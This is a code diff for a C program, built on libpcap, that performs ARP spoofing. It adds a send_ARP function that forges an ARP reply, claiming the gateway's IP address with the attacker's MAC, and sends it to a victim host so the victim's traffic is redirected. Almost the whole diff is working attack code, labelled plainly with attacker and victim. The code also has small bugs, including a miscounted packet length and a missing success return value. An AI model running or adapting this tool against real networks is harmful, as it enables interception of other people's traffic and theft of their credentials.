@@ -14,7 +14,7 @@ void print_IP(unsigned long ip);
 void getAttackerInfo(ULONG* attacker_ip, ULONG* gateway_ip, u_int8_t* attacker_mac, char* spNetDevName);
 u_int8_t* getVictim_MAC(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, u_int8_t* attacker_mac);
 pcap_t* connectIface(char * spNetDevName);
-
+int send_ARP(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, ULONG gateway_ip, u_int8_t* victim_mac, u_int8_t* attacker_mac);
 int main(int argc, char *argv[])
 {
 	pcap_t* pDes = NULL;
@@ -34,6 +34,8 @@ int main(int argc, char *argv[])
 	getAttackerInfo(&attacker_ip, &gateway_ip, attacker_mac, spNetDevName);
 
 	memcpy(victim_mac, getVictim_MAC(pDes, victim_ip, attacker_ip, attacker_mac), ETHER_ADDR_LEN);	// get victim mac
+
+	send_ARP(pDes, victim_ip, attacker_ip, gateway_ip, victim_mac, attacker_mac);
 
 	printf("=====Attacker=====\n");
 	print_IP(attacker_ip);
@@ -155,6 +157,9 @@ u_int8_t* getVictim_MAC(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, u_int8
 	memcpy(ehp.ether_shost, attacker_mac, ETHER_ADDR_LEN);
 	ehp.ether_type = htons(ETHERTYPE_ARP);
 
+	//
+	// set arp packet value for know victim's mac addr
+	//
 	ahp.ar_hrd = htons(ARPHRD_ETHER);	// mac type
 	ahp.ar_pro = htons(ETHERTYPE_IP);	// protocol type
 	ahp.ar_hln = ETHER_ADDR_LEN;	// hadware size
@@ -184,9 +189,6 @@ u_int8_t* getVictim_MAC(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, u_int8
 		return 0;
 	}
 
-	printf("send ok\n");
-
-	//memset(packetbuf, 0x00, 1500);	// clear packet buffer
 	const unsigned char * pkt_data;
 	while ((res = pcap_next_ex(pDes, &header, &pkt_data)) >= 0) {
 		if (res == 0) continue;
@@ -205,10 +207,56 @@ u_int8_t* getVictim_MAC(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, u_int8
 		}
 	}
 	return 0;
-	//pcap_sendpacket(pDes,,)
 }
 
+int send_ARP(pcap_t* pDes, ULONG victim_ip, ULONG attacker_ip, ULONG gateway_ip, u_int8_t* victim_mac, u_int8_t* attacker_mac) {
+	ETHER_HDR ehp;
+	ARP_HDR ahp;
+	UCHAR packetbuf[1500];
 
+	int res;
+	struct pcap_pkthdr *header;
+
+	memcpy(ehp.ether_dhost, victim_mac, ETHER_ADDR_LEN);	// set broadcast
+	memcpy(ehp.ether_shost, attacker_mac, ETHER_ADDR_LEN);
+	ehp.ether_type = htons(ETHERTYPE_ARP);
+
+	//
+	// set arp packet value for know victim's mac addr
+	//
+	ahp.ar_hrd = htons(ARPHRD_ETHER);	// mac type
+	ahp.ar_pro = htons(ETHERTYPE_IP);	// protocol type
+	ahp.ar_hln = ETHER_ADDR_LEN;	// hadware size
+	ahp.ar_pln = 4;	//protocol size
+	ahp.ar_op = htons(ARPOP_REPLY);	// opcode (request = 1)
+
+	memset(packetbuf, 0x00, 1500);	// clear packet buffer
+
+	memcpy(packetbuf, &ehp, sizeof(ETHER_HDR));
+	memcpy(packetbuf + sizeof(ETHER_HDR), &ahp, sizeof(ARP_HDR));
+
+	int temp_cnt = sizeof(ETHER_HDR) + sizeof(ARP_HDR);
+
+	//set Send MAC addr (attacker)
+	memcpy(packetbuf + temp_cnt, attacker_mac, ETHER_ADDR_LEN);	
+	temp_cnt += ETHER_ADDR_LEN;
+
+	//set Send IP addr (Gateway)
+	*(ULONG *)(packetbuf + temp_cnt) = htonl(gateway_ip);
+	temp_cnt += sizeof(gateway_ip);
+
+	//set Target MAC addr (Victim)
+	memcpy(packetbuf + temp_cnt, victim_mac, ETHER_ADDR_LEN);
+	temp_cnt += ETHER_ADDR_LEN;
+
+	//set Target IP aadr (VIctim)
+	*(ULONG *)(packetbuf + temp_cnt) = htonl(victim_ip);
+
+	if (pcap_sendpacket(pDes, packetbuf, sizeof(ETHER_HDR) + sizeof(ARP_HDR) + temp_cnt) != 0) {
+		printf("[-] Error sending the ARPpacket to victim\n");
+		return 0;
+	}
+}
 void print_MAC(u_int8_t * mac) {
 	for (int i = 0; i<6; i++) {
 		printf("%02X", *(mac + i));
